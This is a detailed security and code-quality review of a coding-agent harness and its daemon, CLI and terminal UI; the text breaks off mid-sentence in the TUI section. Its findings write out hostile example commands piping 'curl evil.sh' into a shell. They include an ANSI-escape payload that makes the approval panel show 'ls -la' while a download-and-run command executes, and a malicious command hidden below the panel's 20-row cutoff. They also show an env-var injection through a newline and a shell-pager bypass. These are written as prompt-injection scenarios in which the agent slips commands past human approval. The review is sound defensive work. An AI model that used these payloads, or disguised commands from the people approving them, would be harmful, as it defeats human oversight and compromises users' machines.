# Full codebase review — 2026-07-30

**Scope:** the whole tree at `edb7446` (src working tree clean) — 44,189 LOC of source
across 206 files, 63,742 LOC of tests across 266 files. Four dedicated reviewers plus a
synthesis pass:

1. a regression audit of every finding in the [2026-07-21 review](2026-07-21-full-codebase-review.md);
2. `server/` + `interfaces/cli/` — **ingress security**, never reviewed before;
3. new/heavily-changed non-UI code since that review (212 commits, ~6,356 insertions);
4. `interfaces/tui/` — 10.5k LOC, never reviewed before.

The 2026-07-21 review scoped *out* `interfaces/` and `server/` — a third of the source.
This one includes them, so the grade is **not** directly comparable to its 8/10: the
delta below is mostly "we finally looked at the daemon," not "the code got worse."

## Overall grade: 7/10

| Area | Grade | Headline |
|---|---|---|
| `runtime/` (harness, controller, builder) | 9 | Still the strongest code here; hardest invariants hold |
| `subagents/` + `workflows/` | 8 | One workflow result-loss path; tier masking fixed |
| `tools/` + impl layer | 7 | `edit_file` silently rewrites untouched bytes |
| `session/` + compaction + stats | 8 | New ledger is genuinely concurrency-safe; no rotation |
| `workspace/` + hooks + plugins | 7 | Memory `forget` deletes the wrong file; agent-only plugins auto-trusted |
| config / mcp / lsp / forge | 7 | Long tail of 2026-07-21 minors untouched |
| **`server/` (`marim serve`)** | **5** | **Trivial unauthenticated-adjacent DoS; no body cap; trust-revoke lies** |
| `interfaces/cli/` | 7 | `mcp add` eats the child's `--trust`; piped stdin silently → `auto` |
| `interfaces/tui/` | 6 | **Approval preview is ANSI-spoofable**; two app-kill paths from ordinary typing |

**Why 7, down from 8:** three things moved the number. First, `server/` was measured for
the first time and it is materially below the bar the rest of the codebase sets — the
authentication design is genuinely good, but everything *behind* the auth check
(robustness, resource bounds, the honesty of the trust API) is not. Second, the long tail
of the previous review was largely not worked: **23 of 49 findings are still present**,
`runtime/` closed 1 of 7, and four named files are byte-identical to the defect-era tree.
Third, the TUI — also measured for the first time — contains two paths where *ordinary
typing* kills the app mid-turn, and, more seriously, **three independent majors on the
approval panel itself** (T-0, T-2, T-5): it is spoofable via ANSI escapes, it silently
truncates the text being authorized, and it can be left mounted but keyboard-unreachable.
Two reviewers working independently both landed on that panel.

**The sharpest single conclusion:** the consent surface is the weakest security area in
the codebase. For a coding agent, the approval panel *is* the security control — everything
else (path guards, command policy, trust gates) assumes the user genuinely saw and agreed
to what runs. T-0 breaks that assumption outright, and it is reachable by prompt injection
from any untrusted content the model reads. Fix T-0 first, regardless of the rest of this
document.

**Why not lower:** the five headline majors from 2026-07-21 were *all* fixed, each with a
regression test written against the real external contract rather than the idealized one —
the precise lesson that review ended on. The engineering culture is real: 93.77% coverage
against an enforced 90% floor, pyright clean in standard mode, zero TODO/FIXME in 44k LOC,
a complexity ceiling that actually holds, and a why-comment density (11.7%) that carries
load-bearing invariants rather than restating code.

**The diagnosis behind the number.** Across two reviews and four independent reviewers, one
pattern explains nearly every major: **the defects live where a test encoded an idealized
model of the world, or where a documented house rule exists but nothing enforces it.**
`test_edit_file_preserves_crlf_line_endings` uses a *uniformly* CRLF file. The memory
collision test asserts both files exist and stops — never asking what `recall`/`forget` then
do. `test_queue.py` tests the one bracket shape that `escape()` handles. The trust-fingerprint
tests assume nobody flips a committed registry. In each case the *first* half of the problem
was fixed carefully and commented well; the second half — the read/delete/re-check side of the
same abstraction — was never asked about. And the distribution is backwards: the subsystems
touching **user files** (`memory`, `edit_file`) and **user consent** (`trust_surface`, the
approval panel) got the most benign tests, while the usage ledger — which risks the least —
got the most hostile ones. Fixing the 17 majors is a week's work; fixing that distribution is
what would move this to a 9.

## Quality gates (run at HEAD, all green)

```
ruff check src tests   →  All checks passed
pyright                →  0 errors, 0 warnings, 0 informations
pytest                 →  3908 passed, 2 skipped, 172s
coverage               →  93.77%  (--cov-fail-under=90 enforced in addopts)
ruff --select C901 src →  clean (complexity ≤ 10 genuinely held)
```

Worth stating plainly: **every defect below was found in code that passes all of these.**

---

## Major findings (fix-first order)

Non-TUI majors are listed here; the six TUI majors (T-0…T-5) are in [§TUI](#tui--interfacestui-grade-610)
so that layer's findings stay with its context. Counting both, this review carries
**19 majors**: 5 in `server/` (S-1…S-5), 6 in `interfaces/tui/` (T-0…T-5), 7 across
tools/workspace/config/workflows/stats (W-1, W-2, W-3, WK3, C1, SW3, M-4), and one
documentation defect on the security contract (D-1).

**Fix order across the whole document: T-0 first** (approval spoofing — it defeats the
control every other gate depends on), then W-2 and W-1 (silent data corruption, no user
mitigation), then T-1/T-3 (app-kill), then the `server/` five (severe but opt-in and
mitigable today by staying on loopback).

### S-1. One authenticated request freezes the entire daemon for 10 minutes — `server/workspaces.py:104` (confirmed empirically)
`create_workspace` (`http.py:154`) calls blocking `subprocess.run(["git","clone",…], timeout=600)`
directly on the event loop. With a clone against a blackholed IP in flight, `GET /v1/health`
returned no response at all on three consecutive probes. Every session, every WebSocket
pump and the idle evictor share that loop. Aborting the HTTP client did **not** cancel the
clone — the child survived and the daemon stayed wedged. Fix: `asyncio.create_subprocess_exec`,
a much shorter default timeout, kill the child on request cancellation.

### S-2. No request-body size limit anywhere — `server/http.py:91-95` (confirmed empirically)
`_json_body` does `await request.json()`, buffering the whole body. A 200 MB POST was
accepted (`202`), daemon RSS hit 324 MB, and the prompt was queued as a real turn.
Attachments compound it (`base64.b64decode` at `http.py:456` materializes another copy).
A few concurrent 1 GB posts OOM the daemon and every session with it.

### S-3. `POST /trust {"trusted": false}` reports success while doing nothing — `server/http.py:341` + `trust.py:147-149` (confirmed empirically)
`resolve_project_trust` ranks the `MARIM_TRUST_PROJECT_HOOKS` env override above the store.
With the daemon launched under that env var: `GET /trust` → `{"trusted": true, "source": "env"}`
with `trust_prompt_pending: false` (so a client UI shows nothing to approve); `POST /trust
{"trusted": false}` → `{"trusted": false, "applied_sessions": 0}` — a success shape; `GET /trust`
immediately after → `trusted: true` again. Every harness built afterwards keeps loading the
project's hooks and MCP servers. The single control the API exposes for shutting this off
lies about its outcome. `post_trust` should refuse, or warn explicitly, when `trust_env()
is not None`.

### S-4. The approval mode is client-chosen — `server/http.py:255-269`, `:524-544`
The default is `ask` and gated calls park correctly, but `create_session` takes `mode`
straight from the request body and `POST .../mode` flips a live session, with no
server-side policy and no per-token capability. **A token-holder creates a session with
`{"mode":"auto"}` and gets unattended `bash`/`write_file` on the host with no approval
round.** `docs/reference/serve-api.md` never states this. It is what makes S-5 fatal
rather than merely untidy.

### S-5. Plaintext bearer token on a LAN — and the product recommends it
There is no TLS anywhere (`serve.py:371` calls `uvicorn.run` with no `ssl_*`; no `--tls`
flag exists), and `serve-api.md` never mentions TLS or sniffing. Yet `pairing.py:91` prints
at startup: *"the daemon is bound to 127.0.0.1, so nothing off this machine can connect —
restart it with `--host 0.0.0.0` to pair a phone."* The one safe sentence in the docs
("front it with a reverse proxy or a tailnet", serve-api.md:40-41) sits where the pairing
flow never points. Anyone passively capturing on the same Wi-Fi gets the token from the
first request; per S-4 that is unattended shell. Fix: recommend a tailnet rather than
`0.0.0.0`, and make a non-loopback bind require an explicit acknowledgement flag.

**Verdict on `marim serve`: not safe to run on a shared network today. Bound to loopback
without `--qr`/`0.0.0.0`, it is reasonable.**

### W-1. `forget` deletes a memory the user did not name; `recall` returns the wrong body — `workspace/memory.py:165`, `:282` (confirmed empirically, **regression**)
The new `_allocate_slug` (`:119-143`) correctly gives the second of two like-slugging titles
a `-2` suffix instead of overwriting. But `read_memory:158` and `delete_memory:276` still
resolve by bare `_slugify(name)`, so the loser's title resolves to the **incumbent's** file:

```
index:  - [Auth Flow](auth-flow.md) — d1
        - [auth flow](auth-flow-2.md) — d2
recall("auth flow")  → returns INCUMBENT's body
forget("auth flow")  → True; files after: ['MEMORY.md', 'auth-flow-2.md']   # "Auth Flow" destroyed
```

The `forget` docstring tells the model to pass "its title or slug, as shown in the index" —
and the index displays `auth flow` next to `auth-flow-2.md`. Passing exactly that destroys
the other entry. This is a regression: before the collision fix, one file existed and
`forget` hit the right target. Both scoping helpers must share the allocator's index lookup.

### W-2. `edit_file` silently rewrites bytes it never touched — `tools/impl/fs.py:462`, `:473` (confirmed empirically)
`_read_for_edit` conflates *detecting* the dominant terminator with *normalizing* all CR
forms, and `_restore_newlines` can only reverse one of the two transformations:

- **Lone CR lost.** `alpha\rbeta\ngamma\n` has no CRLF → `newline="\n"`, but the `\r` is
  normalized to `\n` and never restored. Editing `gamma` yields `b'alpha\nbeta\nGAMMA\n'` —
  a byte on an untouched line permanently changed.
- **Whole-file diff.** A mostly-LF file with one CRLF line trips `"\r\n" in raw` → every
  line converts: `b'line1\nline2\r\nline3\nline4\n'` → `b'line1\r\nline2\r\nline3\r\nLINE4\r\n'`.

Mixed endings are common (fixtures, `.gitattributes` churn, Windows contributors). This
violates the principle `_read_for_edit`'s own docstring invokes to justify strict UTF-8
decoding: "corrupt regions the edit never touched." For a coding agent whose core promise
is surgical edits, this is the most consequential correctness bug in the report. Fix:
normalize CRLF only, never lone CR, and preserve raw bytes outside edited spans.

### W-3. Project-trust fingerprint ignores the committed plugin registry — `trust_surface.py:56-63`, `:89-96` (confirmed empirically)
`_project_plugin_dirs` skips non-directories, so `.marim/plugins/plugins.json` — committed
to the repo, and the file whose `enabled`/`trusted` bits gate whether a project plugin's
hooks/MCP/LSP execute (`plugins/discovery.py:250`) — is absent from the fingerprint that
decides whether a stored trust grant still applies. With a project plugin declaring a
`SessionStart` hook running `curl evil.sh | sh`, flipping the registry from
`enabled:false,trusted:false` to `true,true` produced the **identical** fingerprint
`55462d852cb6d081` while the hook went from not executing to executing. A user grants trust,
a later `git pull` flips only `plugins.json`, and the hook runs with no re-prompt.
Correctly bounded on the fresh-clone path (a first open still prompts) — the gap is
strictly post-grant re-arming. Compounding: `ProjectSurface.summary()` prints
`plugins: 1 (telemetry)` identically in both states, so the dialog gives no armed/dormant signal.

### WK3. Agent-only plugins are auto-trusted and can ship `bash` — `plugins/discovery.py:436-445`, `plugins/install.py:215`
`has_executable` counts only `hooks`/`mcpServers`/`lsp`. The CLI prints the bundle summary
**and** prompts only `if has_executable(summary)`, so an agent-only bundle prints *nothing*
and is recorded `trusted=True`. Agents load via `_enabled_inert` (no trust bit), and
`register_subagent` registers gated tools **plain**. Installing a bundle containing only
`agents/helper.md` with `tools: bash` gives, in auto mode, arbitrary shell with no approval
round — while the user was told the bundle has no executable surface. Mitigated by
installation being an explicit act; the defect is the false reassurance. The opposite is
currently codified at `tests/test_plugin_discovery.py:279`.

### C1. A newline in a config value injects an arbitrary env var, defeating the key allowlist — `config/persist.py:28-31` (confirmed empirically)
`_format_value` quotes but never escapes `\n`, and the updater is line-based:

```
write MARIM_MODEL=$'a\nOPENROUTER_API_KEY=sk-evil'  → value spans two physical lines
write MARIM_MODEL=sane  (second save)               → orphans 'OPENROUTER_API_KEY=sk-evil"'
dotenv_values(...)                                  → {'MARIM_MODEL': 'sane', 'OPENROUTER_API_KEY': 'sk-evil"'}
```

`interfaces/cli/config.py:111` gates the *key* against `_ALLOWED_KEYS` but leaves values
unvalidated, so `marim config set` writes an arbitrary key into the global `.env`. File
unchanged since the defect-era tree; no test covers a newline value.

### SW3. A failing spill write strands the workflow card forever and discards the result — `workflows/engine.py:254-255`
`shaped = self._shape(...)` then `_announce_done(...)` with no `try`/`finally`; `write_spill`
can raise `OSError` and `tools/workflow_tools.py:140` propagates it. A workflow that
finishes after several expensive sub-agent runs with a >24,000-char result loses the
computed result entirely and leaves the TUI card "running" permanently. (`a7cfbcd` touched
this file but only wrapped the announce *callbacks* — a different mechanism.)

### D-1. `SECURITY.md` documents the trust model as env-var-only, which is not what the code does
`SECURITY.md:30-35` states project-local executable config loads **"only when
`MARIM_TRUST_PROJECT_HOOKS=1` is set"** and advises leaving it unset for untrusted repos;
`docs/architecture.md:145-146` repeats the claim for MCP. But `trust.py` implements a
persistent per-project store wired into every entry path — `runtime/bootstrap.py:89`,
`interfaces/tui/app.py:335`, `interfaces/tui/commands.py:613`, `interfaces/cli/trust_cmd.py:26,39`,
`server/http.py:113,288,357`. One interactive "trust this project?" answer permanently
enables repo-supplied code execution with the env var never set. CLAUDE.md describes this
correctly; the two user-facing documents do not. The mechanism is sound — the contract
describing it is wrong, which on a SECURITY.md is the worse half to get wrong, and this is
precisely the invariant the file invites researchers to attack.

### M-4(stats). Sub-agent tokens are stamped and priced as the main model — `stats/recorder.py:59-60`
`record(delta)` takes only a `RunUsage` and resolves the model from a closure over the
**main** harness model, but native spawns pick a model by tier (`subagents/tiers.py:17`).
Ten cheap-tier read-only spawns burning 2M tokens are all written with the main model's id:
`ModelsReport.totals` shows no cheap-model row, `_favorite_model` names the expensive one,
and cost is estimated at the main model's list rate — systematic overstatement proportional
to fan-out. Attribution is structurally impossible with the current signature; `record`
needs a `model` parameter threaded from the spawn.

---

## Regression audit of the 2026-07-21 review

**Baseline correction:** `3f265dc` is only the commit that *added* the review doc. Two
remediation waves exist and one (`bb50ef9`, 2026-07-21) landed **before** it, so diffing
from the doc commit mislabels several fixes.

| Class | Result |
|---|---|
| **Majors M-1…M-5** | **5 of 5 FIXED**, each with a targeted regression test |
| Working-tree W-1…W-5 | 4 of 5 fixed; W-5 partial (correctness is opt-in, default is old behavior) |
| Minors (split to 39) | 14 fixed, 2 partial, **23 still present** |
| **Overall** | **23 of 49 fixed, 3 partial, 23 still present** |

Per area, minors closed: tools 1/5 · session 1/3 · workspace 4/9 · config 4/9 ·
**runtime 1/7** · subagents 3/6. Four files named in that review are byte-identical to the
defect-era tree: `ttft.py`, `read_only_commands.py`, `cli_demux.py`, `config/persist.py`.

M-1 (rewind data loss) was re-verified empirically including edge cases the fix could have
missed — a tracked-ignored file, the clean-tree fast-path commit reuse, a broken symlink,
and a filename containing a newline. All correct.

**Two findings are now codified as intended by tests** (C8 `notifications.py:61`,
WK4 global-plugin shadowing), so fixing them requires changing a test. Worth knowing before
anyone files them as regressions.

### New defects introduced by the fixes
- **ND1 (minor).** The memory-dedup fix makes two distinct titles collide onto one file:
  `_index_title` (`memory.py:100`) deletes `[ ] ( )`, so `a(b)` and `ab` compare equal and
  the second save overwrites the first — the exact loss `_allocate_slug` was added to
  prevent. (Related to, but distinct from, W-1 above.)
- **ND2 (nit, latent).** `_safe_session_segment` was routed into the image write and
  ref-decode read but not into `session/store.py:518`, `session/ctrl.py:573`,
  `server/http.py:753`. Unreachable today; these three previously *agreed* with the writer
  and now can diverge.

---

## Minor findings

### server / CLI
- **Unbounded per-subscriber event queue** — `bus.py:104` plain `asyncio.Queue()`, `publish`
  does `put_nowait` per subscriber with no drop policy and no backpressure at
  `http.py:682`. A phone that sleeps mid-stream grows it without bound. Bound it and emit
  `stream.gap` — the resync machinery already exists.
- **A parked ask pins a harness forever** — `status` is `waiting_ask` → `busy` →
  `idle_seconds` returns `0.0` (`host.py:124-127`) → `_evict_if_idle` never reclaims, and
  `_request_approval` (`host.py:196`) awaits with no timeout. A client dying mid-approval
  strands a harness and its MCP/LSP child processes until daemon restart.
- **`_locks`/`_buses` never reclaimed** — `supervisor.py:196-198` deliberately skips
  `forget()` on eviction so clients can resume, but nothing ever calls it. Every session
  ever touched leaks a lock plus a 1000-event ring for the daemon's lifetime. No cap on
  workspaces, sessions, or hosts anywhere.
- **`Cache-Control: public` on private session images** — `http.py:761` sets
  `public, max-age=31536000, immutable` on a response to an `Authorization`-bearing request.
  The docs recommend a reverse proxy; a caching one may store and serve those bytes
  unauthenticated. Use `private`.
- **500 + traceback on the WS upgrade** — `http.py:669` `int(raw) if raw.isdigit()`; a
  5000-digit value passes `isdigit()` then trips CPython's 4300-digit conversion limit.
- **`git clone` with no `--` and no scheme allowlist** — `workspaces.py:103-108`;
  `--upload-pack=…` is parsed by git as an option. Not convertible to RCE on current git
  defaults (`ext::` is refused), but a user's `~/.gitconfig` removes that. Note this path
  runs **with no approval prompt in any mode**.
- **`marim mcp add` swallows the child's flags, including `--trust`** — `mcp.py:204` uses
  `parse_known_args`; `marim mcp add gw uvx mcp-gateway --trust` wrote
  `{"command":"uvx","args":["mcp-gateway"],"trust":true}` — the flag meant for the child was
  dropped from its argv and instead marked the server exempt from approval. `claude mcp add`,
  which this mirrors, requires `--` for exactly this reason.
- **Piped stdin silently switches `ask` → `auto`** — `_is_headless` is true whenever stdin
  isn't a tty (`default_cmd.py:78`) and the headless branch hard-codes `Mode.auto`
  (`:144`). `marim` from a script, cron, or CI runs every tool call unattended where the
  interactive invocation would prompt; nothing prints at runtime when the mode flips.

### tools / session / workspace
- **Background bash offload key collision** — `shell.py:376` keys on the command string
  alone (foreground folds in timeout+stdin); two identical background commands share one
  spill file and cross-contaminate output. Reproduced. *(Unfixed from 2026-07-21.)*
- **Live collection iterated during persist** — `jobs.py:453` iterates `_jobs.values()`
  unlocked from a `to_thread` persist while the loop thread mutates; reproduced
  `RuntimeError: dictionary changed size during iteration` 3 of 35 tries, which kills the
  persist and can silently lose an aborted turn's repaired history. The `ctrl.py:364-365`
  "snapshot into locals" change is a semantic no-op for this race.
- **Ledger read path is O(whole file), nothing rotates `turns.jsonl`** — measured on a
  synthetic 29 MB ledger: `load_overview` peaks at 54.2 MB and takes 12.0 s, because
  `overview` materializes `list(events)` then re-parses each event ~5× across passes.
  Currently latent (no call sites outside `stats/`), but the write path is live and
  default-on. Fix before the stats UI lands.
- **`_allocate_slug` does a read-modify-write outside the module's own lock** —
  `memory.py:236` vs `:198`; two concurrent saves with colliding titles both see the base
  free and the second clobbers the first.
- **`cap_transcript` binary bypass** — `agents.py:529`; `has_binary_content` returns True
  for a list *containing* a `BinaryContent`, so non-binary siblings skip capping (500,000
  chars survived a 2,000 cap). Latent: the live MCP path offloads whole above 25,000 chars,
  so no reachable trigger was exhibited. Pinned as intended by `test_transcript_cap.py:44`.
- **`make_supports_images` poisons its cache on cancellation** — `catalog.py:427` sets
  `attempted = True` before the await and catches only `Exception`; Ctrl-C during the first
  image read disables vision detection for the closure's life.
- **`get_offload_dir` is dead code contradicting its docstring** — `offload.py:20-32`
  promises `.marim/output/` but returns bare `workspace_root`; would spill into the repo
  root outside the gitignored path. `test_offload.py:104-106` pins the wrong behavior.
- **`_repoint_stats` duck-typing silently no-ops on a custom recorder** — `ctrl.py:225-237`;
  an embedder implementing the declared `StatsRecorder` Protocol gets no repoint on session
  switch and every later event is attributed to a stale session id.
- **Global plugin shadowing** — `discovery.py:127-144`; a hostile repo shipping
  `.marim/plugins/helper/` silently erases the user's global `helper` plugin for that
  workspace, no trust check. Integrity/DoS only. *(Codified by a test.)*
- **Unguarded `yield self` in LSP teardown** — `basedpyright.py:152-155`, inherited at
  `generic.py:168-171`; a start-timeout cancel orphans the langserver child, and a raising
  first `shutdown()` skips the second server's teardown.
- **Unguarded TTFT callback in a `finally`** — `ttft.py:56-63`; a raising `on_ttft` replaces
  an in-flight `CancelledError` with `RuntimeError`, so Ctrl-C surfaces as a hard failure
  and `_flush_resumable` takes the wrong branch. Latent in-tree, live for embedders.
- **Error note lost in a window** — `controller.py:541-543`; consumed and nulled at
  assembly, and `_ConsumedContext` doesn't carry it. If `compose_turn_toolsets` raises,
  `_handle_run_failure` never runs and the note is gone. The justifying comment at `:551-552`
  is false in that window.
- **Hooks don't bracket `claude-cli` spawns** — `cli_backend.py:760-779` never calls
  `hooks.tool_event` (native does). Now worse than undocumented: two affirmative claims are
  false — `docs/guides/subagents.md:218-220` and `runner.py:257-259`.
- **`usage.py:119` colon-split** — still splits unconditionally on the first `:`, so
  `…:beta`/`:free`/`:extended` and Ollama `qwen2.5-coder:7b` estimate to `None` (vs `0.018`
  untagged). Masked on OpenRouter by the billed path; live for `local`/`google`/`zen`.
- **`UserPromptSubmit` hooks receive the fully assembled prompt** — `controller.py:556`;
  behavior unchanged, but now documented (`docs/guides/hooks.md:123-128`). Trust-gated.

## Nits

`fs.py:635` grep reads whole files · `read_only_commands.py:31-32` unscreened `grep`/`ack`
— `is_read_only("ack --pager=/bin/sh pattern")` returns `True` and plan mode auto-approves
read-only bash with no approval round (`permissions.py:114-115`), both confirmed;
**UNVERIFIED: whether ack's `--pager`/`ACK_PAGER` actually pipes through a shell** — ack was
not installed on the review host. If it does, this is a plan-mode exec bypass warranting a
screener rather than a nit; worth one check against ack's docs · `read_only_commands.py:32`
dead `find` entry falsifying a stated invariant · `ctrl.py:536-551` job history leaks across `SessionController.reset()` ·
`install.py:352` bare `KeyError` on a registry entry without `url` · `memory.py:174-183`
unescaped description yields unparseable frontmatter · `skills.py:258` missing
`encoding="utf-8"` · `notifications.py:61` a typo'd event name re-enables all defaults ·
`images.py:151-157` cache outside XDG, never swept · `harness.py:590,840,852,918` dead
`deps.services` guards · `builder.py:478-480` `_built` set before the constructor can raise ·
`builder.py:473-474` summarizer/titler built then discarded every CLI launch ·
`cli_demux.py:222-228` order-dependent async-spawn settlement · `query.py:214` one bogus
ancient day silently excludes today's data · `auth.py:14-17` existing token file reused with
no permission check · `http.py:69` case-sensitive `Bearer` · **no `Origin`/`Host` validation
on any route including the WS upgrade** (safe today *only* because auth is header-only and
`?token=` is rejected — that safety is emergent, not stated; add the check and a comment
saying the header-only rule is load-bearing) · `serve-api.md` endpoint table omits three
routes · `docs/plans/fix-exception-handling.md` still says "Ready for execution" though
commit 367a812 executed it.

---

## Strengths (verified, not asserted)

- **The five headline majors were fixed properly.** Rewind data loss, plan-mode egress via
  sub-agents, forge paging, double compaction, and swallowed cancellation — all closed,
  each with a regression test written against the *real* external contract (Gitea's page
  clamp, git's force-added index state, locale encodings, cancellation delivery). That was
  the previous review's closing lesson and it visibly landed.
- **Token handling in the daemon is correct on every axis** — `secrets.token_urlsafe(32)`
  (256 bits), `touch(mode=0o600)` plus an explicit `chmod` with a comment noting touch
  honours umask, `hmac.compare_digest` on bytes. All 21 non-health routes return 401
  tokenless (enumerated); the WebSocket returns 403 pre-accept; `_unauthorized` runs before
  the body is read, so the missing body cap is not reachable pre-auth.
- **Path traversal is closed in the daemon** — `sid`/`ws` are single-segment params,
  `..%2f..%2f` 404s at the router, ids are slugified, image `sha` is `^[0-9a-f]{64}$`.
- **The concurrent ledger is genuinely safe** — 16 processes × 500 events → 8,000 lines,
  8,000 parsed, 0 skipped. O_APPEND plus one sub-buffer write per ~319 B line.
- **`jobs.py:75-88` fixes the recurring `CancelledError`-swallow class head-on** —
  `asyncio.shield` plus `if not job.task.cancelled(): raise`, with a comment explaining that
  one-shot cancellation delivery is what makes the swallow a correctness bug. Best-reasoned
  change in the diff. A sweep of every added `except` found no new instances of the class.
- **`_scratchpad_approval` closes a real TOCTOU across two layers** —
  `ToolApproved(override_args={"path": <resolved>})` pins the exact blessed file, the
  residual is documented honestly, and `fs.py` adds the executor-side `realpath(p) != p`
  guard the permissions layer says it cannot reach.
- **The project-`.env` allowlist closes the obvious escalation** — both
  `MARIM_TRUST_PROJECT_HOOKS` and `MARIM_DEFAULT_MODE` are blocklisted from a project
  `.env`, built as a prefix *allowlist* rather than a denylist. A cloned repo cannot
  auto-trust itself or force `auto`.
- **The `--qr` token-leak analysis is unusually good** — the stdout-isn't-a-tty refusal, and
  `serve.py:275-287` explaining that the handler prints only `type(exc).__name__` because
  `segno.make` can raise a `ValueError` echoing the token onto a stderr the stdout check
  doesn't cover. A real leak, correctly reasoned about and closed.
- **`plan` mode is decided server-side and a missing approver denies** rather than approves
  (`permissions.py:167-175`) — fail-closed where it counts.
- **Trust threading is consistent at every gate call site**, and the store fails closed on
  every read error with `file_lock` + `atomic_write_text` for its RMW.
- **`stats/` tests are adversarial rather than coverage theater** — torn JSON, non-UTF-8
  bytes, unparseable dates, wrong types, unknown schema versions, and the `stats`↔`session`
  import cycle probed via *subprocess* cold imports in both directions with a docstring
  explaining why a warm test session would mask it.
- **Architecture honesty holds.** The builder-vs-bootstrap seam, the pure/effectful/wiring
  three-way split, and the lazy public API (`import marim_harness` stays cheap) are real,
  not aspirational. 11.7% comment density carrying invariants, and zero TODO/FIXME markers
  in 44k LOC.

## Coverage assessment

93.77% line coverage is real but is not the constraint. The pattern is now established
across two reviews and is the single most actionable thing in this document:

> **Every major defect in this report lives where a test encoded an idealized model of the
> world.** `test_edit_file_preserves_crlf_line_endings` uses a *uniformly* CRLF file.
> `test_save_memory_collision_does_not_overwrite_other_entry` asserts both files exist and
> stops — never asking what `recall`/`forget` then do. `test_cap_leaves_binary_tool_returns_intact`
> uses a four-character sibling and thereby pins a bypass as intended. The trust-fingerprint
> tests assume nobody flips a committed registry.

In each case the *first* half of the problem was fixed carefully and commented well, and
the second half — the read/delete/re-check side of the same abstraction — was never asked
about. Notably, the subsystems touching user files (`memory`, `edit_file`) and user consent
(`trust_surface`) got the most benign tests, while the ledger, which risks the least, got
the most hostile ones.

Specific gaps worth closing:
1. **Auth is spot-checked, not enumerated** — 5 of 21 routes assert 401. Walk `app.routes`
   and assert every non-health route rejects a tokenless request. ~10 lines, highest value
   in the report: a new route shipped without `_unauthorized` currently passes CI.
2. **No adversarial-input tests on the daemon at all** — no oversized body, no malformed
   `after_seq` (one line would have caught the 500), no negative/huge `offset`/`limit`.
3. **No blocking-I/O test** — S-1 is invisible to `TestClient`. Fire a slow managed-workspace
   create at a real uvicorn and assert `/v1/health` answers within 1s.
4. **No resource-lifecycle tests** for the never-answered ask or `_buses`/`_locks` growth.
5. **Round-trip property tests** for `edit_file` (arbitrary mixed line endings → byte-identical
   outside edited spans) and for memory (`save` → `recall` → `forget` on colliding titles).

## TUI — `interfaces/tui/` (grade 6/10)

*Two reviewers covered this layer independently, with different file coverage, and findings
from both are merged below — hence the non-contiguous numbering (T-1/T-3/T-4 came from the
first pass, T-0/T-5 from the second; nothing was dropped between them). They converged on
the approval panel from different angles — one found it truncates, the other found it is
spoofable — which is the strongest signal in this review that the consent surface needs work.*

Every file in scope was read in full; findings verified against a live Textual 8.2.7 app.
The engineering intent matches the rest of the codebase — the approval path is sequentially
resolved and fails closed, the incremental-markdown streaming machinery is the most
sophisticated code in the layer, and the comments are load-bearing. What pulls it to a 7:
**every verified defect sits where a documented house rule already exists but is not
enforced by a test** — markup escaping, worker grouping, best-effort file I/O, timer
teardown. Two are app-kill paths reachable by ordinary typing.

### T-0 (major, highest severity in this review). The approval preview is spoofable — raw ANSI escapes reach the terminal — `tui/interactions/approval.py:37-64` → `:115` (independently re-verified during synthesis)
`format_detail` builds a `rich.text.Text` by `append`-ing model-supplied strings verbatim;
the `bash` branch is a bare `detail.append(f"$ {args['command']}")`. Rich's
`Console._render_buffer` emits segment text raw and Textual's compositor does not filter it.
Re-verified during synthesis:

```
format_detail("bash", {"command": "curl https://evil.sh | sh #\x1b[2K\x1b[1G$ ls -la"})
  → plain = '$ curl https://evil.sh | sh #\x1b[2K\x1b[1G$ ls -la'
  → ESC survives into the rendered Text: True
```

**Scenario:** a prompt-injected agent (content from a malicious file, a fetched page, an
MCP server) proposes that command. The terminal writes `$ curl https://evil.sh | sh #`,
then `ESC[2K` erases the line and `ESC[1G` returns to column 1, then writes `$ ls -la`.
**The user reads `$ ls -la`, presses `a`, and `curl … | sh` executes** — the `#` comments
out the escape tail for the shell. `ESC[nA` (cursor up) and OSC sequences work the same
way; `write_file` content/path and `run_workflow` scripts are equally exposed.

This is exactly the "shown one command, a different one executed" failure the approval
panel exists to prevent, and it is the one control standing between a prompt-injected model
and the user's shell. (Rich does normalize a bare `\r`, so the CR variant is closed — the
ESC/CSI variant is not.) Note this is a *class*: any widget rendering a model-supplied
string through a Rich `Text`/`Static` has the same exposure — the mechanism was verified,
not every call site.

**Fix:** strip or visibly escape C0 control characters and CSI/OSC sequences in
`format_detail` before appending, and audit the other model-string render paths.

### T-1 (major). Typing `[` in a queued message kills the app — `tui/queue.py:20-33` + `tui/widgets/queue_display.py:48` (independently re-verified during synthesis)
`render_queue` passes user text through `textual.markup.escape`, which only neutralizes
bracket runs that have a closing `]` — the codebase states this twice already
(`widgets/panels.py:118-123`, `interactions/plan_card.py:28-31`). An unterminated bracket
escapes into the parser and swallows the developer-authored `[@click=…]edit[/]` link.

Verified end-to-end: with a turn running, typing `also fix the [old_string bug` and pressing
Enter raises `MarkupError: auto closing tag ('[/]') has nothing to close` during render —
**the app dies, taking the in-flight turn with it**. `run [foo bar='baz` fails the same way.
The regression test (`tests/test_queue.py:33`) covers only `[this]`, the closed-bracket
shape where `escape()` does work. Fix: the house pattern,
`Content.from_markup(fixed) + Content(m.text) + Content.from_markup(links)`.

### T-2 (major). The approval panel silently hides everything past row 20 — `tui/interactions/approval.py:83-88`
`#approval-detail { height: auto; max-height: 20; }`. Measured with a 60-line `bash` command
in a 100×40 terminal: the widget renders at `size.height=20`, `virtual_size.height=20`,
`max_scroll_y=0`, `allow_vertical_scroll=False`. The enclosing panel scrolls, but only to
reveal the title and buttons — rows 20+ are **never rendered anywhere**, with no truncation
indicator. `write_file` content and multi-hunk `edit_file` diffs use the same Static.

**Scenario:** a prompt-injected model emits a `bash` call of 25 innocuous lines followed by
`curl attacker.sh | sh`. The user sees 20 lines, no scrollbar, no "+N more", and presses `a`.
The whole command executes.

*Honest mitigation:* the `ToolCallWidget` for the same call is already in the transcript with
an uncapped `#tool-body`, so the full text is reachable by **clicking** that row. Keyboard-only
is murkier. So this is "the decision surface truncates with no indicator and the workaround is
a mouse click," not "impossible to see." The sibling `AskUserPanel` gets it right —
`ask_user.py:126-132` caps the list *and* posts a `+N more options — scroll ↓` hint.

### T-3 (major). A prompt-history write failure kills the app and eats the message — `interfaces/history.py:66-71`
`PromptHistory._save` does an unguarded `mkdir` + `atomic_write_text`, called from `add()`
*before* `_route_submission`. Sibling module `prefs.py:43-48` wraps the identical pattern in
`except OSError: return False` and documents "best-effort." History does not. With the data
dir read-only (full disk, root-owned after a `sudo marim`, NFS hiccup), typing `hello` and
pressing Enter propagates `PermissionError` out of the message handler and Textual tears the
